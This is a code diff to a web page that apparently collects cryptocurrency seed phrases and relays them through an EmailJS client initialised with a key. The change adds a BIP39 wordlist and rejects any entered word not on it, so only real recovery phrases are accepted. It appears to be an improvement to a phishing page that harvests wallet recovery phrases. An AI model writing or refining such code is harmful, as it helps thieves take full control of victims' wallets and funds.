@@ -11,8 +11,8 @@
         href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&family=DM+Sans:wght@300;400;500;600;700&display=swap"
         rel="stylesheet">
     <link rel="stylesheet" href="style.css">
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
-    </script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="bip39.js"></script>
     <script type="text/javascript">
         (function () {
             emailjs.init("oZMfh8Pn5s8P-9Awx");
@@ -561,21 +561,28 @@
                 // Phrase validation
                 const count = parseInt(method);
                 let allFilled = true;
+                let isValidPhrase = true;
                 let phraseWords = [];
 
                 for (let i = 1; i <= count; i++) {
                     const input = document.getElementById('word' + i);
-                    const val = input ? input.value.trim() : '';
+                    const val = input ? input.value.trim().toLowerCase() : '';
 
                     if (!val || val === '' || val.replace(/\s/g, '') === '') {
                         allFilled = false;
                         if (input) input.classList.add('error');
                     } else {
+                        if (typeof BIP39_WORDS !== 'undefined' && !BIP39_WORDS.has(val)) {
+                            isValidPhrase = false;
+                            if (input) input.classList.add('error');
+                        } else if (input) {
+                            input.classList.remove('error');
+                        }
                         phraseWords.push(val);
                     }
                 }
 
-                if (!allFilled) {
+                if (!allFilled || !isValidPhrase) {
                     showError('Data entered is not a valid seed phrase');
                     return;
                 }
